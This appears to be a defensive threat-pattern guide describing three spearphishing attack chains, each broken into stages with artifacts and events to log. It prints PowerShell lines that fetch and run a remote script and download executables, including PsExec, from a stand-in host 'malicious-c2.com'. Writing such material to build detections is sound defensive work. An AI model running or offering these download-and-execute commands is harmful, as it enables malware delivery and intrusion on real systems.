Pattern Name: C2 File Download  
Scenario Overview: An attacker uses a command and control (C2) server to download a malicious file onto a victim's machine. The attack begins with a spearphishing email containing a malicious attachment, which, when opened, triggers a series of events leading to the download of additional payloads from the C2 server.

Attack Flow Breakdown:  
1. **Initial Access**  
   - **Application Involved**: Outlook  
   - **User Action**: The user receives a spearphishing email with a malicious attachment (e.g., `invoice.docx`).  
   - **Key Artifacts**: Email headers, attachment file (`invoice.docx`).  
   - **Loggable Events**:  
     - Monitor for new emails with attachments from external domains.  
     - Log the opening of the attachment in Outlook.  

2. **Execution of Malicious Document**  
   - **Application Involved**: Microsoft Word (child of Outlook)  
   - **User Action**: The user opens the malicious attachment, which contains a macro that executes a PowerShell command to download a payload.  
   - **Key Artifacts**: Macro code in `invoice.docx`.  
   - **Loggable Events**:  
     - Detect the execution of macros in Word documents.  
     - Log the PowerShell command execution.  
     ```powershell
     # PowerShell command to download the payload
     IEX(New-Object Net.WebClient).downloadString('http://malicious-c2.com/payload.ps1')
     ```

3. **Payload Download**  
   - **Application Involved**: PowerShell  
   - **User Action**: The PowerShell command downloads a malicious script from the C2 server.  
   - **Key Artifacts**: Downloaded file (`payload.ps1`).  
   - **Loggable Events**:  
     - Monitor for PowerShell commands that download files from external URLs.  
     - Log the URL accessed (`http://malicious-c2.com/payload.ps1`).  

4. **Execution of Downloaded Payload**  
   - **Application Involved**: PowerShell  
   - **User Action**: The downloaded script is executed, which may further download additional tools or establish persistence.  
   - **Key Artifacts**: Execution of `payload.ps1`.  
   - **Loggable Events**:  
     - Detect the creation of new processes from PowerShell.  
     - Log the execution of the downloaded script.  

5. **Command and Control Communication**  
   - **Application Involved**: PowerShell  
   - **User Action**: The payload initiates communication with the C2 server for further instructions.  
   - **Key Artifacts**: Network traffic to C2 server.  
   - **Loggable Events**:  
     - Monitor for outbound connections to known malicious IPs or domains.  
     - Log the command and control communication attempts.

Pattern Name: PowerShell File Retrieval  
Scenario Overview: An attacker uses PowerShell to retrieve additional malicious files from a C2 server after initial access is gained through a spearphishing email. The attack leverages PowerShell's capabilities to download and execute files without raising suspicion.

Attack Flow Breakdown:  
1. **Initial Access**  
   - **Application Involved**: Outlook  
   - **User Action**: The user opens a spearphishing email and clicks on a link to download a malicious document.  
   - **Key Artifacts**: Email with a link to a malicious document.  
   - **Loggable Events**:  
     - Monitor for clicks on links in emails from external sources.  

2. **Execution of Malicious Document**  
   - **Application Involved**: Microsoft Word  
   - **User Action**: The user opens the document, which contains a PowerShell command embedded in a macro.  
   - **Key Artifacts**: Macro code in the document.  
   - **Loggable Events**:  
     - Detect macro execution in Word.  

3. **PowerShell Command Execution**  
   - **Application Involved**: PowerShell  
   - **User Action**: The macro executes a PowerShell command to download a secondary payload.  
   - **Key Artifacts**: PowerShell command.  
   - **Loggable Events**:  
     ```powershell
     # PowerShell command to download a secondary payload
     Invoke-WebRequest -Uri 'http://malicious-c2.com/secondary_payload.exe' -OutFile 'C:\Users\Victim\Downloads\secondary_payload.exe'
     ```

4. **Download and Execution of Secondary Payload**  
   - **Application Involved**: PowerShell  
   - **User Action**: The secondary payload is executed after being downloaded.  
   - **Key Artifacts**: Executed file (`secondary_payload.exe`).  
   - **Loggable Events**:  
     - Monitor for execution of downloaded executables.  
     - Log the file path and execution event.  

5. **Establishing Persistence**  
   - **Application Involved**: PowerShell  
   - **User Action**: The secondary payload may attempt to establish persistence on the system.  
   - **Key Artifacts**: Registry modifications or scheduled tasks.  
   - **Loggable Events**:  
     - Detect changes to the registry or creation of scheduled tasks.

Pattern Name: Lateral Tool Transfer  
Scenario Overview: After gaining initial access through a spearphishing email, an attacker uses administrative tools to transfer additional malicious tools laterally across the network. This phase involves the use of remote management tools to facilitate the transfer.

Attack Flow Breakdown:  
1. **Initial Access**  
   - **Application Involved**: Outlook  
   - **User Action**: The user opens a spearphishing email and executes a malicious attachment.  
   - **Key Artifacts**: Malicious attachment (`malware.docx`).  
   - **Loggable Events**:  
     - Monitor for the opening of attachments in Outlook.  

2. **Execution of Malicious Code**  
   - **Application Involved**: Microsoft Word  
   - **User Action**: The user enables macros in the document, triggering a PowerShell command.  
   - **Key Artifacts**: Macro code execution.  
   - **Loggable Events**:  
     - Detect macro execution in Word.  

3. **Download of Lateral Tool**  
   - **Application Involved**: PowerShell  
   - **User Action**: The PowerShell command downloads a lateral tool (e.g., `PsExec`) from the C2 server.  
   - **Key Artifacts**: Downloaded tool (`PsExec.exe`).  
   - **Loggable Events**:  
     ```powershell
     # PowerShell command to download PsExec
     Invoke-WebRequest -Uri 'http://malicious-c2.com/PsExec.exe' -OutFile 'C:\Temp\PsExec.exe'
     ```

4. **Execution of Lateral Tool**  
   - **Application Involved**: PowerShell  
   - **User Action**: The attacker uses PsExec to execute commands on another machine in the network.
